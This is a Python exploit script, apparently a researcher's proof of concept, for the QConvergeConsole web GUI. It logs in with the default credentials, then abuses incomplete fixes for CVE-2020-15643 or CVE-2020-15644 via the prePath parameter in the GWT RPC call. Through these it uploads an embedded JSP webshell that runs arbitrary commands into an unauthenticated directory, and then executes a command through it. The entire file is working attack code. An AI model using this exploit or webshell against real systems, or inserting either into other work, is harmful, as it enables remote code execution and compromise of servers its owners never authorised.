import http.server, requests, socket
import os, sys, threading, argparse, json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def gen_jsp_webshell():
  jsp = b'''
<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>'''
  return jsp


#
# MAIN
# 
descr  = 'This script uploads a JSP wehshell and sends a command to it.'
 
parser = argparse.ArgumentParser(descr, formatter_class=argparse.RawTextHelpFormatter)
required = parser.add_argument_group('required arguments')
required.add_argument('-t', '--target',required=True, help='Target host')
parser.add_argument('-p', '--port', type=int, default=8080, help='QConvergeConsole GUI web server port, default: %(default)s')
parser.add_argument('-U', '--user', default='QCC', help='User name, default: %(default)s')
parser.add_argument('-P', '--pass', dest = 'password', default='config', help='User password, default: %(default)s')
parser.add_argument('-s', '--tls',  action='store_true', help='Use TLS connection')
parser.add_argument('-v', '--vuln', type=int, choices=[1,2], default=1, 
  help = 'Vulnerability to exploit:\n'
         '  1 - CVE-2020-15643 incomplete fix; saveAsText prePath parameter\n'
         '  2 - CVE-2020-15644 incomplete fix; setAppFileBytes prePath parameter\n')

args = parser.parse_args()
host      = args.target
port      = args.port
user      = args.user
password  = args.password
use_tls   = args.tls
vuln      = args.vuln

print('Logging in with credentials %s/%s' % (user, password))

webapp = 'QConvergeConsole'
if use_tls:
  scheme = 'https'
else:
  scheme = 'http'

# Get a login form 
url = '%s://%s:%d/%s/' % (scheme, host, port, webapp)
r = requests.get(url, verify=False) 
sid = r.cookies['JSESSIONID']
if sid is None:
  sys.exit('Failed to get a login session ID')

# Perform login 
url = '%s://%s:%d/%s/j_security_check' % (scheme, host, port, webapp)
cookies = {'JSESSIONID':sid}
data = {'j_username':user, 'j_password':password}
r = requests.post(url, cookies=cookies, data=data, verify=False, allow_redirects=False) 
if r.status_code != 302:
  sys.exit('Login failed')

location = r.headers['Location']
if location.startswith('/'):
  location = location[1:]
  
# Get an authenticated session ID
url = '%s://%s:%d/%s' % (scheme, host, port, location)
r = requests.get(url, cookies= cookies, verify=False) 
sid = r.cookies['JSESSIONID']
if sid is None:
  sys.exit('Failed to get an authenticated session ID')

#
# Upload JSP webshell
#

# Base directory for the QCCAgentInstallers webapp, which
# does not require authentication.
noauth_webapp = 'QCCAgentInstallers'
upload_dir = '%s/%s' % ('webapps', noauth_webapp) 
upload_file = '%s_%d.jsp' % ('webshell', vuln)

jsp = gen_jsp_webshell()
jsp_bytes = ''
for b in jsp:
  jsp_bytes += '%d|' % (b)

print('Uploading %s to directory %s' % (upload_file, upload_dir))
url = '%s://%s:%d/%s/com.qlogic.qms.hba.gwt.Main/gwttestservice' % (scheme, host, port, webapp)

headers = {'Content-Type':'text/x-gwt-rpc; charset=UTF-8', 'X-GWT-Permutation': 'deadbeef'}
cookies = {'JSESSIONID':sid}

if vuln == 1:
  data = '7|0|8|' 
  data += '%s://%s:%d/%s/com.qlogic.qms.hba.gwt.Main/|' % (scheme, host, port, webapp)
  data += 'serialization_policy|'
  data += 'com.qlogic.qms.hba.gwt.client.GWTTestService|'
  data += 'saveAsText|'
  data += 'java.lang.String/2004016611|'
  data += '[B/3308590456|'
  data += '%s|' % (upload_dir)
  data += '%s|' % (upload_file)
  data += '1|2|3|4|3|5|5|6|7|8|6|'
  data += '%d|' % (len(jsp))
  data += jsp_bytes 
elif vuln == 2:
  data = '7|0|9|' 
  data += '%s://%s:%d/%s/com.qlogic.qms.hba.gwt.Main/|' % (scheme, host, port, webapp)
  data += 'serialization_policy|'
  data += 'com.qlogic.qms.hba.gwt.client.GWTTestService|'
  data += 'setAppFileBytes|'
  data += 'java.lang.String/2004016611|'
  data += 'I|'
  data += '[B/3308590456|'
  data += '%s|' % (upload_dir)
  data += '%s|' % (upload_file)
  data += '1|2|3|4|5|5|5|6|7|6|8|9|4|7|'
  data += '%d|' % (len(jsp))
  data += jsp_bytes 
  data += '1|' 

r = requests.post(url, headers=headers, cookies=cookies, data=data, verify=False) 
if not r.text.startswith('//OK'):
  print(r.text)
  sys.exit('Failed to upload %s to directory %s' % (upload_file, upload_dir))
  
cmd = 'whoami' 
params = {'cmd': cmd}
url = '%s://%s:%d/%s/%s' % (scheme, host, port, noauth_webapp, upload_file)
url = requests.Request('GET', url, params=params).prepare().url
print('Issuing command: %s' % (url))
r = requests.get(url, params=params, verify=False) 
if r.status_code != 200:
  sys.exit('Failed to execute the command. \nIt is possible that an anti-virus software (e.g. Windows Defender) on the remote host removed the webshell once it is uploaded.')
  
print(r.text)